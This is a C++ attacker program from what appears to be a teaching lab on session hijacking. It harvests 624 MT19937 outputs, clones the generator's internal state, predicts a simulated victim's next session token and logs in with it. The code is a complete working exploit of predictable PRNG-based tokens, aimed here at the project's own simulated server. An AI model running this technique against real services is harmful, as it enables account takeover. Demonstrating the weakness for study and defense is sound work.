#include <array>
#include <cstdint>
#include <cstring>
#include <filesystem>
#include <iomanip>
#include <iostream>
#include <sys/wait.h>
#include <vector>

#include "core/mt19937.hpp"
#include "crypto_analysis/untemperer.hpp"
#include "session_hijack/protocol.hpp"
#include "session_hijack/session_client.hpp"

/**
 * @file attacker.cpp
 * @brief Client attaquant (Bob) du scénario d'usurpation de session.
 *
 * Scénario en trois temps :
 *   1. Lecture des tokens interceptés chez Alice (fichier produit par session_victim setup).
 *   2. Collecte des sorties PRNG manquantes en tant que client légitime (Bob).
 *   3. Clonage de l'état MT19937, prédiction du prochain token d'Alice, usurpation.
 */

namespace {

    /// Résout le chemin absolu du binaire session_victim (même répertoire que l'attaquant).
    [[nodiscard]] std::filesystem::path resolve_victim_binary() {
        const std::filesystem::path self = std::filesystem::read_symlink("/proc/self/exe");
        return self.parent_path() / "session_victim";
    }

    /// Lance Alice en mode login (demande de token uniquement, sans authentification).
    /// @return PID du processus fils, ou -1 en cas d'erreur.
    [[nodiscard]] pid_t spawn_victim_login(const std::filesystem::path& victim_binary) {
        const pid_t child = fork();
        if (child < 0) {
            return -1;
        }

        if (child == 0) {
            execl(victim_binary.c_str(), victim_binary.c_str(), "login", static_cast<char*>(nullptr));
            _exit(EXIT_FAILURE);
        }

        return child;
    }

    /// Lance Alice en mode auth après l'usurpation (doit échouer).
    [[nodiscard]] pid_t spawn_victim_auth(const std::filesystem::path& victim_binary) {
        const pid_t child = fork();
        if (child < 0) {
            return -1;
        }

        if (child == 0) {
            execl(victim_binary.c_str(), victim_binary.c_str(), "auth", static_cast<char*>(nullptr));
            _exit(EXIT_FAILURE);
        }

        return child;
    }

    /// Attend la terminaison d'un processus fils lancé par fork().
    void wait_for_child(pid_t child) {
        if (child > 0) {
            int status = 0;
            (void)waitpid(child, &status, 0);
        }
    }

} // namespace

int main() {
    // --- Phase 1 : lecture des tokens interceptés chez Alice (observation passive) ---
    std::vector<std::uint32_t> observed_tokens;
    if (!SessionClient::load_tokens(SessionProtocol::OBSERVED_TOKENS_FILE, observed_tokens)) {
        std::cerr << "[-] Attaquant : impossible de lire " << SessionProtocol::OBSERVED_TOKENS_FILE
                  << ". Lancez d'abord : ./session_victim setup\n";
        return EXIT_FAILURE;
    }

    if (observed_tokens.size() >= SessionProtocol::MT_STATE_SIZE) {
        std::cerr << "[-] Attaquant : trop de tokens interceptés (max "
                  << SessionProtocol::MT_STATE_SIZE - 1 << ").\n";
        return EXIT_FAILURE;
    }

    const std::size_t remaining = SessionProtocol::MT_STATE_SIZE - observed_tokens.size();
    std::cout << "[+] Attaquant : " << observed_tokens.size()
              << " tokens interceptés chez Alice (capture réseau simulée).\n";
    std::cout << "[*] Attaquant : collecte de " << remaining
              << " tokens supplémentaires en tant que client légitime (Bob)...\n";

    // --- Phase 2 : collecte des sorties manquantes via une connexion légitime ---
    auto socket_opt = SessionClient::connect_to_server();
    if (!socket_opt.has_value()) {
        std::cerr << "[-] Attaquant : connexion au serveur impossible.\n";
        return EXIT_FAILURE;
    }

    for (std::size_t i = 0; i < remaining; ++i) {
        std::uint32_t token = 0;
        if (!SessionClient::request_token(socket_opt.value(), token)) {
            std::cerr << "[-] Attaquant : erreur réseau lors de la collecte (index " << i << ").\n";
            return EXIT_FAILURE;
        }
        observed_tokens.push_back(token);
    }

    // Fermeture de la connexion de Bob : le serveur est mono-thread et ne peut
    // traiter qu'un client à la fois. Alice doit pouvoir se connecter ensuite.
    socket_opt.value().close_fd();
    socket_opt.reset();

    if (observed_tokens.size() != SessionProtocol::MT_STATE_SIZE) {
        std::cerr << "[-] Attaquant : flux incomplet (" << observed_tokens.size() << " tokens).\n";
        return EXIT_FAILURE;
    }

    std::cout << "[+] Attaquant : " << SessionProtocol::MT_STATE_SIZE
              << " sorties consécutives reconstituées. Clonage de l'état interne...\n";

    // --- Phase 3 : reconstruction de l'état MT19937 et prédiction du token d'Alice ---
    std::array<std::uint32_t, SessionProtocol::MT_STATE_SIZE> intercepted_array{};
    std::array<std::uint32_t, SessionProtocol::MT_STATE_SIZE> cloned_state{};

    for (std::size_t i = 0; i < SessionProtocol::MT_STATE_SIZE; ++i) {
        intercepted_array[i] = observed_tokens[i];
    }

    CryptoAnalysis::Untemperer::clone_state(intercepted_array, cloned_state);

    CryptoCore::MT19937 local_clone;
    local_clone.set_state(cloned_state);

    const std::uint32_t predicted_token = local_clone.next_u32();
    std::cout << "[+] Attaquant : token prédit pour la prochaine session d'Alice : 0x"
              << std::hex << std::uppercase << std::setw(8) << std::setfill('0')
              << predicted_token << std::dec << "\n";

    // --- Phase 4 : Alice demande son token pendant que l'attaquant prépare l'usurpation ---
    const std::filesystem::path victim_binary = resolve_victim_binary();
    if (!std::filesystem::exists(victim_binary)) {
        std::cerr << "[-] Attaquant : binaire introuvable : " << victim_binary << "\n";
        return EXIT_FAILURE;
    }

    std::cout << "[*] Attaquant : lancement d'Alice (login) pour obtenir son token au serveur...\n";
    const pid_t victim_login_pid = spawn_victim_login(victim_binary);
    if (victim_login_pid < 0) {
        std::cerr << "[-] Attaquant : impossible de lancer session_victim login.\n";
        return EXIT_FAILURE;
    }

    wait_for_child(victim_login_pid);

    std::vector<std::uint32_t> victim_login_tokens;
    if (!SessionClient::load_tokens(SessionProtocol::VICTIM_LOGIN_TOKEN_FILE, victim_login_tokens)
        || victim_login_tokens.empty()) {
        std::cerr << "[-] Attaquant : impossible de lire le token reçu par Alice.\n";
        return EXIT_FAILURE;
    }

    const std::uint32_t alice_token = victim_login_tokens.front();
    std::cout << "[+] Attaquant : token réellement émis à Alice         : 0x"
              << std::hex << std::uppercase << std::setw(8) << std::setfill('0')
              << alice_token << std::dec << "\n";

    if (predicted_token != alice_token) {
        std::cerr << "[-] ÉCHEC : la prédiction ne correspond pas au token d'Alice.\n";
        return EXIT_FAILURE;
    }

    std::cout << "[+] PRÉDICTION VALIDÉE : le token d'un autre utilisateur est connu à l'avance.\n\n";

    // --- Phase 5 : usurpation — l'attaquant s'authentifie avec le token d'Alice ---
    std::cout << "[*] Attaquant : soumission du token volé (opcode 0x02)...\n";

    auto hijack_socket_opt = SessionClient::connect_to_server();
    if (!hijack_socket_opt.has_value()) {
        std::cerr << "[-] Attaquant : reconnexion impossible pour l'usurpation.\n";
        return EXIT_FAILURE;
    }

    bool hijack_success = false;
    if (!SessionClient::verify_token(hijack_socket_opt.value(), predicted_token, hijack_success)) {
        std::cerr << "[-] Attaquant : erreur réseau lors de l'usurpation.\n";
        return EXIT_FAILURE;
    }

    // Libère le serveur mono-thread pour la connexion d'Alice (auth).
    hijack_socket_opt.value().close_fd();
    hijack_socket_opt.reset();

    std::cout << "--------------------------------------------------------\n";
    if (hijack_success) {
        std::cout << "[+] RÉSULTAT : ACCÈS ACCORDÉ à l'attaquant avec le token d'Alice.\n";
        std::cout << "[+] Session d'Alice compromise : usurpation réussie.\n";

        // Alice tente ensuite de s'authentifier avec son propre token (doit échouer).
        std::cout << "[*] Attaquant : lancement de la tentative d'authentification d'Alice...\n";
        const pid_t victim_auth_pid = spawn_victim_auth(victim_binary);
        wait_for_child(victim_auth_pid);
    } else {
        std::cout << "[-] RÉSULTAT : ACCÈS REFUSÉ. Le token a été rejeté.\n";
    }
    std::cout << "--------------------------------------------------------\n";

    return hijack_success ? EXIT_SUCCESS : EXIT_FAILURE;
}
